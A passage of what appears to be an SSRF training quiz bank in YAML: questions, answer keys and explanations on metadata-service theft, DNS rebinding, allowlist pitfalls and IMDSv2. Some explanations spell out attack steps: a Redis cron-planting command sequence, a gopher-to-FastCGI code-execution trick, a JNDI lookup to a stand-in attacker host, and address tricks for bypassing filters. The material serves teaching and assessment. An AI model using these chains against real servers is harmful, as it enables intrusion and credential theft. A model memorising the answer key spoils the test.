  - SSRF always requires the victim to click a malicious link first, while CSRF needs no victim interaction
  - SSRF abuses the server to make requests from its network position; CSRF abuses the victim's browser
    to make requests with the victim's cookies
  answer: 3
  explanation: |
    Different actor and trust boundary: CSRF rides the victim's authenticated browser
    session; SSRF coerces the server itself into making requests using the server's network
    access and identity.
  ref: concepts.md#what-ssrf-is
- id: ssrf-and-server-side-request-attacks-047
  difficulty: advanced
  tags:
  - gcp
  - azure
  - metadata
  question: |
    An SSRF payload targets GCP's metadata server. Which detail is correct?
  options:
  - GCP metadata requires no special header at all, resolving over a plain GET exactly like AWS IMDSv1
  - GCP metadata is served strictly over HTTPS and requires a per-instance client certificate to read
  - 'GCP metadata (metadata.google.internal / 169.254.169.254) requires the header Metadata-Flavor: Google'
  - GCP does not expose any instance metadata service, so this SSRF target simply does not exist there
  answer: 2
  explanation: |
    GCP requires the Metadata-Flavor: Google header on metadata requests (Azure requires
    Metadata: true). This header requirement is itself a mild SSRF mitigation, since many
    fetchers cannot set custom headers.
  ref: concepts.md#impact-and-attack-surface
- id: ssrf-and-server-side-request-attacks-048
  difficulty: advanced
  tags:
  - scenario
  - defense-review
  question: |
    A team fixes their SSRF-prone image importer. Which implementation is actually safe?
  options:
  - Parse with one URL library, allow only http/https, resolve all A/AAAA records, reject non-public IPs,
    connect to the pinned IP, and disable redirect following
  - Block the literal strings '127.0.0.1' and '169.254.169.254' in the host, then fetch with redirects enabled
  - Only accept import URLs submitted by logged-in users and then follow every redirect the target returns
  - Resolve the hostname, confirm the address is public, then re-resolve the same name and connect to it by name
  answer: 0
  explanation: |
    The safe design combines every control: single parser, scheme allowlist, resolve-all-
    records + public-IP check, IP pinning (defeats rebinding), and no redirect following.
    The others fall to encoding tricks, redirects, or DNS rebinding.
  ref: concepts.md#defense-allowlist-and-re-resolve
- id: ssrf-and-server-side-request-attacks-049
  difficulty: beginner
  tags:
  - schemes
  - disable-redirects
  question: |
    Why should automatic redirect following be disabled (or re-validated) in an
    SSRF-sensitive client?
  options:
  - Following redirects noticeably slows the request by adding extra round trips to each fetch
  - Redirect responses break the TLS handshake because the certificate cannot be re-validated mid-connection
  - HTTP redirect status codes were formally deprecated and removed in the HTTP/2 specification
  - A validated URL can redirect to an unvalidated internal target or a dangerous scheme like gopher://
  answer: 3
  explanation: |
    If validation only checks the first URL, a redirect can send the client to an internal
    IP or switch to a dangerous scheme. Disable auto-follow or re-validate each hop and
    restrict redirect protocols.
  ref: concepts.md#dangerous-url-schemes-and-protocol-smuggling
- id: ssrf-and-server-side-request-attacks-050
  difficulty: intermediate
  tags:
  - rce
  - redis
  - scenario
  question: |
    An attacker has SSRF that can send arbitrary bytes to an internal, unauthenticated
    Redis on port 6379. What is the realistic worst case?
  options:
  - They can only read the Redis server version banner returned by the INFO command and nothing more
  - They can degrade Redis performance with expensive commands but never compromise the underlying host
  - Remote code execution — e.g. scripting Redis to write a cron job or SSH key, achieving command execution
  - Nothing at all, because Redis silently discards any bytes that begin with a valid HTTP request line
  answer: 2
  explanation: |
    With arbitrary-byte SSRF (e.g. via gopher://), an unauthenticated Redis can be driven to
    write files (cron entries, SSH keys, webshells), turning SSRF into remote code
    execution on the host.
  ref: concepts.md#dangerous-url-schemes-and-protocol-smuggling
- id: ssrf-and-server-side-request-attacks-051
  difficulty: advanced
  tags:
  - cve
  - proxylogon
  - authentication-bypass
  question: |
    ProxyLogon (CVE-2021-26855) is frequently cited as a landmark SSRF. What made it
    especially severe compared to a typical credential-stealing SSRF?
  options:
  - It was a pre-auth SSRF that made the Exchange front-end issue back-end requests as the server itself,
    effectively authenticating as the machine account
  - It leaked the Exchange server's TLS private key, letting attackers passively decrypt all captured mail traffic
  - It only worked against fully on-premises Active Directory forests and never affected hybrid or hosted deployments
  - It required a valid authenticated mailbox login to a target account before the request could be triggered at all
  answer: 0
  explanation: |
    CVE-2021-26855 was an unauthenticated SSRF: a crafted /autodiscover request with a malicious
    X-BEResource cookie made the client-access front-end forward an attacker-controlled request
    to the back-end as the Exchange server, bypassing authentication. Chained with CVE-2021-27065
    (arbitrary file write) it produced RCE across tens of thousands of servers.
  ref: concepts.md#real-world-ssrf-cves-and-incidents
- id: ssrf-and-server-side-request-attacks-052
  difficulty: advanced
  tags:
  - cve
  - capital-one
  - imdsv2
  question: |
    In the Capital One (2019) breach, an SSRF reached IMDSv1 and stole IAM credentials. Would
    enforcing IMDSv2 (HttpTokens=required, hop-limit 1) most likely have prevented it, and why?
  options:
  - No, because IMDSv2 still exposes the identical role credentials in response to the very same unauthenticated GET
  - No, because IMDSv2 merely encrypts the response payload in transit but continues to answer plain tokenless GETs
  - Yes, because the simple GET could not perform the PUT+token handshake, and hop-limit/XFF-rejection
    would block the proxied path
  - Yes, because enabling IMDSv2 removes IAM role credentials from the metadata service entirely and stores them elsewhere
  answer: 2
  explanation: |
    The attack used a plain GET through a proxy. IMDSv2 requires a PUT to obtain a token plus a
    custom token header on each GET, defaults to hop-limit 1, and rejects PUTs carrying
    X-Forwarded-For — all of which defeat that GET-through-a-proxy primitive. IMDSv2 still serves
    credentials, but only to a properly authenticated local caller.
  ref: concepts.md#real-world-ssrf-cves-and-incidents
- id: ssrf-and-server-side-request-attacks-053
  difficulty: intermediate
  tags:
  - cve
  - gitlab
  - features
  question: |
    GitLab CVE-2021-22214 was an unauthenticated SSRF. Which feature pattern introduced it?
  options:
  - A CI/CD feature that fetched a remote .gitlab-ci.yml by URL (project import / ci lint)
  - A password-reset email template that embedded an attacker-controlled reset link into the outgoing message
  - A Markdown comment renderer that executed embedded JavaScript when the rendered note was later viewed
  - A webhook signature verification routine that fetched the remote public key used to validate payloads
  answer: 0
  explanation: |
    The vulnerability lived in a "fetch a remote CI config by URL" path (import / ci/lint), the
    classic fetch-a-URL feature. Because it was reachable unauthenticated, an attacker could make
    the GitLab server issue arbitrary internal requests, including to metadata.
  ref: concepts.md#real-world-ssrf-cves-and-incidents
- id: ssrf-and-server-side-request-attacks-054
  difficulty: advanced
  tags:
  - gcp
  - metadata
  - bypass
  question: |
    An SSRF against GCP metadata cannot set custom request headers. Which historical detail
    could still let it read metadata without the Metadata-Flavor: Google header?
  options:
  - The computeMetadata/v1/ endpoint accepts a ?noheader=true query parameter that waives the header requirement
  - GCP metadata has never required any header on any endpoint, serving every version over a plain unheadered GET
  - Appending a trailing dot to metadata.google.internal silently disables the server's header-enforcement check
  - The legacy v0.1/ and v1beta1/ endpoints did not enforce the Metadata-Flavor header (now deprecated/disabled)
  answer: 3
  explanation: |
    Header enforcement on GCP is version-specific: only computeMetadata/v1/ requires
    Metadata-Flavor: Google. The older v0.1/ and v1beta1/ endpoints historically served metadata
    without that header — a real SSRF footgun until they were deprecated/disabled.
  ref: concepts.md#gcp-and-azure-metadata-specifics
- id: ssrf-and-server-side-request-attacks-055
  difficulty: advanced
  tags:
  - azure
  - metadata
  - headers
  question: |
    Which combination of requirements does Azure's Instance Metadata Service enforce, mirroring
    several IMDSv2 protections?
  options:
  - A Metadata: true header, an api-version query parameter, and rejection of requests carrying X-Forwarded-For
  - An OAuth2 Authorization Bearer token plus mutual TLS with a per-instance client certificate
  - A one-time CAPTCHA challenge on first contact followed by a signed session cookie on later reads
  - Only that the request originate from a routable public IP on the instance's primary network interface
  answer: 0
  explanation: |
    Azure IMDS requires the header Metadata: true (missing it yields 400 "Required metadata header
    not specified"), an api-version query parameter, and it rejects any request carrying
    X-Forwarded-For — plus it must bypass proxies. These parallel IMDSv2's header/XFF defenses.
  ref: concepts.md#gcp-and-azure-metadata-specifics
- id: ssrf-and-server-side-request-attacks-056
  difficulty: advanced
  tags:
  - open-redirect
  - bypass
  - scenario
  question: |
    A fetcher allowlists the host, resolves and pins the IP (public), and rejects private ranges,
    but still follows redirects. An attacker submits https://trusted.example/go?next=http://169.254.169.254/.
    Why does this succeed?
  options:
  - The pinned IP check is silently skipped whenever the URL carries query-string parameters after the host
  - The AAAA (IPv6) record of trusted.example resolves straight to the link-local metadata address at fetch time
  - Pinning the resolved IP turns off TLS certificate validation, so the client trusts whatever host it lands on
  - trusted.example has an open redirect; host validation and the IP check pass, then the app follows the
    redirect internally to metadata
  answer: 3
  explanation: |
    This is open-redirect chaining, distinct from generic redirect-following: the submitted host
    is genuinely allowlisted and public, so host and IP checks pass. The trusted host's own open
    redirect then sends the client to the internal target. Fix: don't auto-follow (or re-validate
    each hop) AND fix the open redirect.
  ref: concepts.md#open-redirect-chaining-and-hidden-input-vectors
- id: ssrf-and-server-side-request-attacks-057
  difficulty: advanced
  tags:
  - hidden-vectors
  - referer
  question: |
    A security review found no user-facing "url" field, yet the app is SSRF-vulnerable. Which
    commonly overlooked input does an analytics/link-preview backend often fetch?
  options:
  - The Content-Length header
  - The TLS cipher suite
  - The Accept-Language header
  - The value of the Referer header
  answer: 3
  explanation: |
    Analytics and link-preview backends frequently fetch the URL in the Referer header (e.g. to
    generate a thumbnail of the referring page). PortSwigger explicitly flags Referer, along with
    Host/X-Forwarded-Host, as hidden SSRF attack surface beyond an obvious url parameter.
  ref: concepts.md#open-redirect-chaining-and-hidden-input-vectors
- id: ssrf-and-server-side-request-attacks-058
  difficulty: expert
  tags:
  - blind
  - oob
  - egress
  question: |
    During blind SSRF testing you receive a DNS lookup on your OAST listener but no HTTP callback.
    What is the most accurate conclusion and next step?
  options:
  - DNS egress is open but outbound HTTP is blocked by network filtering; pivot to internal-only OOB payloads
    or exploit the server's own HTTP client
  - The target is not vulnerable at all; a DNS lookup alone never proves the sink fired, so stop testing
  - The HTTP callback was lost to an upstream proxy cache; simply resend the identical payload until it arrives
  - The server merely resolved the name during input validation, so this is really a reflected XSS, not SSRF
  answer: 0
  explanation: |
    A DNS hit proves the sink fires and resolves your name, but a missing HTTP hit indicates HTTP
    egress is filtered. That distinguishes "vulnerable but egress-controlled" from "fully
    exploitable." Next: target internal services directly, or exploit a bug in the server's own
    HTTP client/parser (client-side exploitation).
  ref: concepts.md#blind-ssrf-weaponization-and-client-side-exploitation
- id: ssrf-and-server-side-request-attacks-059
  difficulty: expert
  tags:
  - blind
  - port-scan
  - oracle
  question: |
    You have a semi-blind SSRF with no response body. Which timing pattern most reliably indicates
    a firewalled/filtered internal port versus a closed one?
  options:
  - Closed and filtered ports both return instantly with identical timing, giving no usable oracle
  - A firewalled/filtered port always responds faster than a closed port refusing the connection
  - A closed port returns fast (connection refused); a filtered port hangs and then times out (slow)
  - Timing carries no usable information at all once the HTTP response body is stripped away
  answer: 2
  explanation: |
    A closed port returns "connection refused" almost immediately (fast), while a firewalled/
    filtered port silently drops packets, so the connection hangs until timeout (slow). Open ports
    return a response (medium). This three-way timing split is the classic semi-blind port-scan
    oracle, augmented by status-code/length/error differentials.
  ref: concepts.md#blind-ssrf-weaponization-and-client-side-exploitation
- id: ssrf-and-server-side-request-attacks-060
  difficulty: expert
  tags:
  - blind
  - client-side
  - cracking-the-lens
  question: |
    "Cracking the Lens"-style exploitation of blind SSRF turns a non-reflecting SSRF into potential
    compromise by doing what?
  options:
  - Brute-forcing the internal service's admin password by replaying millions of guesses over the SSRF channel
  - Reflecting the hidden response body back to the attacker by chaining it through a second cooperating endpoint
  - Abusing the SSRF to relay bulk phishing emails through the server's internal SMTP gateway to external victims
  - Making the server connect to an attacker server that returns a malicious response exploiting a bug in
    the server's own HTTP client/parser
  answer: 3
  explanation: |
    Instead of relying on reaching internal services, the attacker forces the server to fetch an
    attacker-controlled URL whose response exploits a vulnerability in the server's HTTP client or
    parser (oversized headers, decompression bombs, deserialization). This can yield RCE with zero
    response reflection.
  ref: concepts.md#blind-ssrf-weaponization-and-client-side-exploitation
- id: ssrf-and-server-side-request-attacks-061
  difficulty: expert
  tags:
  - schemes
  - jndi
  - log4shell
  question: |
    An SSRF/URL value flows into a Java JNDI lookup. Which scheme turns this into the Log4Shell-class
    remote-code-execution primitive?
  options:
  - dict:// (queries a dictionary server; loads no class)
  - tftp:// (plain UDP file fetch; no JNDI lookup)
  - ldap:// (JNDI lookup returning a remote/serialized payload)
  - 'data: (inlines a base64 blob; no remote fetch)'
  answer: 2
  explanation: |
    ldap:// (and rmi://) fed to a JNDI lookup causes the JVM to fetch and instantiate a remote
    object/serialized payload — the Log4Shell mechanism (jndi:ldap://attacker/Exploit). It bridges
    SSRF/URL-fetch to JNDI-injection RCE.
  ref: concepts.md#more-dangerous-schemes-and-crlf-protocol-injection
- id: ssrf-and-server-side-request-attacks-062
  difficulty: expert
  tags:
  - schemes
  - phar
  - deserialization
  question: |
    Why is the PHP phar:// scheme dangerous as an SSRF/file-path primitive?
  options:
  - It transparently encrypts the archive contents so URL filters and WAFs cannot inspect the path or payload
  - It forces every response for the wrapped resource to be served over HTTPS with a self-signed certificate
  - Reading a Phar archive's metadata triggers PHP object deserialization, reachable via a POP gadget chain
    to RCE
  - It silently disables PHP's open_basedir restriction, granting the script read access across the filesystem
  answer: 2
  explanation: |
    When a filesystem-style operation touches a phar:// path, PHP deserializes the archive's
    serialized metadata. If a suitable POP (property-oriented programming) gadget chain exists in
    loaded classes, that deserialization can escalate to code execution.
  ref: concepts.md#more-dangerous-schemes-and-crlf-protocol-injection
- id: ssrf-and-server-side-request-attacks-063
  difficulty: expert
  tags:
  - crlf
  - smuggling
  - scenario
  question: |
    An interviewer says: "gopher:// is disabled and only http/https are allowed. Can SSRF still
    reach an internal Redis?" What is the best answer?
  options:
  - No, disabling gopher fully prevents reaching any non-HTTP text protocol from an http/https-only fetcher
  - Yes, but only if the internal Redis has been misconfigured to bind and listen on a routable public IP
  - No, because Redis strictly rejects and closes any connection whose bytes begin with a valid HTTP method
  - Yes, via CRLF (%0d%0a) injection in the URL smuggling commands into a tolerant text protocol, or a
    redirect to dict:// if that scheme is enabled
  answer: 3
  explanation: |
    Even without gopher, CRLF injection in the outbound URL can inject additional lines/commands
    that a lenient text protocol like Redis will parse despite the HTTP preamble; a redirect to
    dict:// (if enabled) is another path. "Gopher off" does not prove Redis is safe — pin the IP
    and block egress.
  ref: concepts.md#more-dangerous-schemes-and-crlf-protocol-injection
- id: ssrf-and-server-side-request-attacks-064
  difficulty: expert
  tags:
  - gopher
  - redis
  - rce
  question: |
    Walk through gopher-to-RCE via unauthenticated Redis. Which sequence of Redis commands plants
    a cron job on disk?
  options:
  - AUTH default ""; KEYS *; then FLUSHALL to wipe the keyspace and DEBUG SLEEP 0
  - CONFIG GET dir; then INFO server; CLIENT LIST; and DBSIZE to enumerate the box
  - CONFIG SET dir /var/spool/cron/; CONFIG SET dbfilename root; SET x "<cron payload>"; SAVE
  - SUBSCRIBE cron; PUBLISH cron "<payload>"; then WAIT 0 0 and QUIT to close it
  answer: 2
  explanation: |
    The classic chain repoints Redis's working directory to the cron spool, names the DB file
    after a crontab (root), stores a key whose value is a cron line, then SAVE flushes the RDB to
    /var/spool/cron/root, which cron parses and runs. Variants write authorized_keys or a webshell.
  ref: concepts.md#gopher-to-rce-concrete-exploit-steps
- id: ssrf-and-server-side-request-attacks-065
  difficulty: expert
  tags:
  - gopher
  - fastcgi
  - rce
  question: |
    In the gopher-to-FastCGI (PHP-FPM) RCE chain, which FastCGI parameter is abused to execute
    attacker-supplied PHP from the request body?
  options:
  - SCRIPT_NAME pointed at /etc/passwd so FPM returns the password file
  - PHP_VALUE set to auto_prepend_file = php://input (with allow_url_include on)
  - REMOTE_ADDR spoofed to 127.0.0.1 so FPM trusts it as a loopback caller
  - QUERY_STRING loaded with a base64 blob that FPM decodes and runs as PHP
  answer: 1
  explanation: |
    Speaking FastCGI over gopher to a local FPM socket, the attacker sets PHP_VALUE to
    auto_prepend_file = php://input (plus allow_url_include=On) so FPM prepends and executes the
    PHP source sent in the request body — reaching RCE with no web server routing to the script.
  ref: concepts.md#gopher-to-rce-concrete-exploit-steps
- id: ssrf-and-server-side-request-attacks-066
  difficulty: expert
  tags:
  - dns-rebinding
  - happy-eyeballs
  - defense
  question: |
    A fetcher validates and pins the first resolved IPv4 address, but the HTTP client uses Happy
    Eyeballs (RFC 8305). Why can this still be rebound to an internal host?
  options:
  - Happy Eyeballs disables the OS DNS cache entirely, forcing a fresh unvalidated lookup on every connection
  - Happy Eyeballs races A and AAAA connections in parallel, so an unvalidated AAAA (IPv6) address can win
    the race to an internal target
  - RFC 8305 mandates re-resolving the hostname every 100 milliseconds, so the pinned IP is discarded almost instantly
  - IPv6 addresses are globally unique and cannot be private or link-local, so an AAAA record poses no SSRF risk
  answer: 1
  explanation: |
    Happy Eyeballs opens IPv4 and IPv6 connections concurrently and uses whichever succeeds first.
    Validating only the IPv4 (A) address leaves the AAAA path unchecked; a malicious internal IPv6
    can win the race. Correct pinning validates all A and AAAA addresses before connecting.
  ref: concepts.md#dns-rebinding-defense-implementation-traps
- id: ssrf-and-server-side-request-attacks-067
  difficulty: expert
  tags:
  - dns-rebinding
  - pinning
  - tls
  question: |
    You pin the validated IP and connect to that literal IP so DNS can't rebind. What must you also
    do so HTTPS to the original hostname still works correctly?
  options:
  - Disable certificate verification so the literal-IP mismatch no longer fails the handshake
  - Downgrade the connection from HTTPS to plain HTTP so no certificate hostname check runs
  - Add the pinned numeric IP to the server certificate's SAN list so verification succeeds
  - Set the Host header and TLS SNI to the original hostname while connecting to the pinned IP
  answer: 3
  explanation: |
    Connecting to a literal IP would break SNI-based routing and certificate hostname validation.
    The fix is to connect to the pinned IP but present the original hostname as the TLS SNI and in
    the Host header, so certificate validation and virtual-host routing still function.
  ref: concepts.md#dns-rebinding-defense-implementation-traps
- id: ssrf-and-server-side-request-attacks-068
  difficulty: advanced
  tags:
  - dns-rebinding
  - redirects
  - pinning
  question: |
    Why must IP pinning be re-applied on every HTTP redirect hop rather than only on the first
    request?
  options:
  - Each redirect is a new request whose host the client may re-resolve, losing the original pin and allowing
    rebinding to an internal IP
  - Redirects always downgrade the connection to plain HTTP, which silently invalidates the pinned IP binding
  - The pinned IP expires after exactly one second, so any redirect that arrives later must be re-resolved fresh
  - Redirect responses are forbidden from carrying a Location header, so the client must guess the next hop's host
  answer: 0
  explanation: |
    A redirect hop is a fresh connection to a possibly different host; if the client re-resolves
    that host, the earlier pin no longer protects it and rebinding/internal targeting becomes
    possible again. Re-pin (resolve, validate, connect-by-IP) each hop, or don't follow redirects.
  ref: concepts.md#dns-rebinding-defense-implementation-traps
- id: ssrf-and-server-side-request-attacks-069
  difficulty: expert
  tags:
  - allowlist
  - suffix-confusion
  - defense
  question: |
    A host allowlist accepts any host that contains the substring "good.example". Which
    attacker-registered host bypasses it, and what is the correct fix?
  options:
  - good.example.attacker.com (a domain the attacker controls that embeds the allowlisted string); fix by
    matching the exact parsed host, not a substring
  - api.good.example, a legitimate first-party subdomain that the substring test correctly and safely accepts
  - good.example itself, the canonical allowlisted host, which the substring check passes exactly as intended
  - 8.8.8.8, an unrelated public resolver IP that contains no allowlisted substring and is therefore rejected
  answer: 0
  explanation: |
    A substring/contains test is the wrong check: good.example.attacker.com contains
    "good.example" yet the true registrable domain is attacker.com, which the attacker owns.
    (An endsWith test is similarly bypassed by evilgood.example.) Compare the exact parsed
    host and port against the allowlist instead of doing substring matching.
  ref: concepts.md#allowlist-correctness-pitfalls
- id: ssrf-and-server-side-request-attacks-070
  difficulty: advanced
  tags:
  - allowlist
  - port
  - defense
  question: |
    An allowlist validates only the host (good.example) and pins the resolved IP, but does not
    check the port. How can this still be abused?
  options:
  - It cannot be abused at all; validating and pinning the host's resolved IP is by itself completely sufficient
  - The attacker downgrades the negotiated TLS version to an older one so the pinned-IP host check is skipped
  - The attacker appends a URL fragment after a hash so the fetcher routes past the host allowlist unnoticed
  - The attacker uses good.example:6379 (or another port) to target a different internal service on the
    allowlisted host/IP
  answer: 3
  explanation: |
    If the allowlisted host also runs other services (or co-locates with them), specifying a
    different port such as :6379 reaches Redis or another daemon. Validate scheme, host, AND port
    against the allowlist, not the host alone.
  ref: concepts.md#allowlist-correctness-pitfalls
- id: ssrf-and-server-side-request-attacks-071
  difficulty: expert
  tags:
  - allowlist
  - homoglyph
  - punycode
  question: |
    Which allowlist pitfall does the host "gооd.example" (with Cyrillic о characters) exploit, and
    what is the correct countermeasure?
  options:
  - A case-sensitivity bug letting mixed-case hosts slip through; fix by uppercasing the host
  - A trailing-dot bug where "good.example." evades the check; fix by stripping the dot
  - A unicode/homoglyph (IDN) bug; normalize to punycode before comparing against the allowlist
  - A default-port bug where the port is omitted; fix by pinning the connection to port 443
  answer: 2
  explanation: |
    Cyrillic homoglyphs render like Latin letters but are different code points, so the string
    won't match a Latin allowlist entry (and can be registered by an attacker). Normalize
    internationalized names to punycode (ASCII) before comparison to neutralize homoglyph tricks.
  ref: concepts.md#allowlist-correctness-pitfalls
- id: ssrf-and-server-side-request-attacks-072
  difficulty: expert
  tags:
  - imdsv2
  - hop-limit
  - containers
  question: |
    Why is HttpPutResponseHopLimit sometimes set to 2, and what is the security tension this creates?
  options:
  - A hop limit of 2 is mandated for reaching the IPv6 metadata endpoint and carries no security impact whatsoever
  - A hop limit of 2 doubles the issued token's TTL from 6 to 12 hours, weakening expiry and widening the reuse window
  - A hop limit of 2 disables the PUT-plus-token requirement entirely, letting a plain tokenless GET read metadata
  - Containers legitimately need hop-limit 2 to reach IMDS through the container network bridge, but 2 re-opens
    the "SSRF via an extra hop / reverse proxy" path that a limit of 1 closes
  answer: 3
  explanation: |
    Containerized workloads traverse an extra network hop (the bridge) to reach IMDS, so operators
    raise the hop limit to 2. But that same extra hop is exactly what SSRF-through-a-proxy needs,
    so hop-limit 2 weakens the defense that hop-limit 1 provided. Mitigate by restricting the
    metadata endpoint to the intended local process via host firewall rules.
  ref: concepts.md#imdsv2-residual-risk-and-the-hop-limit-tension
- id: ssrf-and-server-side-request-attacks-073
  difficulty: expert
  tags:
  - imdsv2
  - residual-risk
  - scenario
  question: |
    "IMDSv2 is enforced and hop-limit is 1 — are we safe from SSRF credential theft?" What is the
    most accurate senior answer?
  options:
  - Yes — the mandatory PUT-plus-token handshake and the hop-limit of 1 together make the metadata
    endpoint completely unreachable from any SSRF primitive, so credential theft is fully eliminated
  - 'Not necessarily: an SSRF that can set headers and do a PUT, request smuggling, or a container with
    hop-limit 2 can still reach it — so fix the SSRF, block egress to 169.254.169.254, and scope IAM'
  - Yes, as long as the instance is dual-stacked with IPv6, because the metadata service then answers
    only on a link-local IPv6 address that ordinary SSRF fetchers cannot express in a URL
  - No, because IMDSv2 stops serving IAM role credentials entirely and instead hands them out only
    through the AWS STS endpoint, so there is nothing left at 169.254.169.254 to steal
  answer: 1
  explanation: |
    IMDSv2 is defense in depth, not a fix. Full-request-forgery primitives (arbitrary headers +
    PUT), request smuggling, or a legitimately-raised hop limit can still reach it, and non-IMDS
    targets remain. The complete answer fixes the SSRF, blocks metadata egress, and applies
    least-privilege IAM.
  ref: concepts.md#imdsv2-residual-risk-and-the-hop-limit-tension
- id: ssrf-and-server-side-request-attacks-074
  difficulty: advanced
  tags:
  - asvs
  - standards
  - defense
  question: |
    Which OWASP ASVS v4 requirement most directly governs an application's SSRF protection for
    outbound URL fetches?
  options:
  - ASVS section 2.1 (password security requirements), which mandates minimum credential length and
    breached-password checks and is the controlling clause for validating any outbound URL fetch
  - ASVS section 9.1 (client communication security), covering TLS everywhere and cipher configuration,
    which is where the standard places its rules for restricting server-initiated outbound requests
  - ASVS section 4.1 (general access control design), whose enforce-at-a-trusted-layer rule is the
    primary requirement that governs how an application validates and constrains outbound URL fetches
  - 'ASVS section 12.6 (SSRF protection: restrict outbound requests to allowlisted destinations and do
    not follow redirects to untrusted hosts)'
  answer: 3
  explanation: |
    ASVS v4 section 12.6 defines SSRF Protection Requirements — outbound requests limited to
    allowlisted destinations and not following redirects to untrusted hosts — complemented by
    section 5.2.6 on validating untrusted data used in a URL fetch. WSTG-INPV-19 is the matching
    test procedure.
  ref: concepts.md#standards-and-control-references
- id: ssrf-and-server-side-request-attacks-075
  difficulty: advanced
  tags:
  - standards
  - rfc
  - ip-validation
  question: |
    When implementing the numeric resolved-IP range check, which RFC-defined range is most commonly
    forgotten and lets SSRF reach cloud NAT-shared address space?
  options:
  - RFC 1918 private ranges (10/8, 172.16/12, 192.168/16)
  - RFC 3927 link-local 169.254.0.0/16
  - RFC 6598 carrier-grade NAT 100.64.0.0/10
  - RFC 4291 IPv6 loopback ::1
  answer: 2
  explanation: |
    RFC 6598's 100.64.0.0/10 (CGNAT / shared address space) is frequently omitted from denylists
    that remember loopback, link-local, and RFC 1918, yet it can front internal infrastructure in
    some environments. A robust check covers RFC 1918, 3927, 6598, and IPv6 (RFC 4291) ranges,
    including IPv4-mapped forms.
  ref: concepts.md#standards-and-control-references
- id: ssrf-and-server-side-request-attacks-076
  difficulty: advanced
  tags:
  - bypass
  - 0.0.0.0
  - localhost
  question: |
    A filter blocks 127.0.0.1 and "localhost" but a service is bound to 0.0.0.0:8080. Which address
    reaches that service and defeats the filter (the "0.0.0.0-day" issue)?
  options:
  - http://0.0.0.0:8080/ (and [::] ), which routes to a service listening on all interfaces
  - http://example.com:8080/, a public hostname whose A record the resolver maps onto the loopback
    interface once the fetcher rewrites port 8080 to the local service
  - http://256.0.0.0:8080/, a wrap-around address the kernel normalizes back down to 0.0.0.0 and then
    silently forwards to whatever daemon is bound on that port
  - http://8.8.8.8:8080/, which the internal router transparently NATs to the loopback service because
    8080 is reserved for host-local traffic in the default routing table
  answer: 0
  explanation: |
    A service bound to 0.0.0.0 listens on all interfaces, so it is reachable via 0.0.0.0, [::], or
    127.0.0.1. A denylist that only blocks 127.0.0.1/localhost misses 0.0.0.0 and [::] — the
    "0.0.0.0-day" bypass. Validate the resolved numeric IP against all loopback/unspecified ranges,
    including 0.0.0.0/8.
  ref: concepts.md#bypasses-ip-encodings-and-address-tricks
- id: ssrf-and-server-side-request-attacks-077
  difficulty: advanced
  tags:
  - scenario
  - defense-review
  - toctou
  question: |
    Given the pseudocode `ip = resolve(url); if ip.is_public(): fetch(url)`, which two flaws make
    it exploitable and what is the correct fix?
  options:
  - It leaks a socket descriptor on every call and adds latency; fix by memoizing resolve() in a shared
    DNS cache so the is_public() branch is evaluated only once per hostname
  - It only inspects the IPv4 A record while the client may connect over IPv6; fix by unconditionally
    blocking every AAAA record so the fetcher can never open an IPv6 connection at all
  - It has a DNS-rebinding TOCTOU (fetch re-resolves) and an open-redirect/redirect gap; fix by pinning the
    validated IP and disabling or re-validating redirects
  - It transmits the fetched body over plaintext HTTP where a network attacker can read it; fix by
    rewriting the scheme to HTTPS and rejecting any URL that is not already TLS-encrypted
  answer: 2
  explanation: |
    resolve() then fetch(url) re-resolves at connect time (DNS rebinding TOCTOU), and fetch may
    follow a redirect to an internal target that was never validated. The correct fix pins the
    validated IP (connect to that literal IP) AND disables/re-validates redirects on every hop.
  ref: concepts.md#dns-rebinding-defense-implementation-traps
- id: ssrf-and-server-side-request-attacks-078
  difficulty: advanced
  tags:
  - hidden-vectors
  - host-header
  question: |
    Why can the Host or X-Forwarded-Host header be an SSRF sink in some applications?
  options:
  - Browsers populate them automatically from the address bar, so the framework marks their values as
    trusted input and skips the URL validation applied to ordinary request parameters
  - They travel inside the encrypted TLS record before the Host is known, so a fetcher physically cannot
    inspect or filter their value and must forward whatever destination they name
  - They influence only the reverse proxy's cache-key computation and are stripped before any outbound
    fetch, so a poisoned value can never steer where the server actually connects
  - Reverse proxies and "absolute URL" builders may use the header value to construct an outbound request
    or route, letting an attacker steer where the server connects
  answer: 3
  explanation: |
    Some apps and proxies build outbound URLs or routing decisions from the Host/X-Forwarded-Host
    value (e.g. password-reset links, cache keys, internal routing). An attacker-controlled header
    can then redirect where the server connects — an SSRF sink hidden in header handling.
  ref: concepts.md#open-redirect-chaining-and-hidden-input-vectors
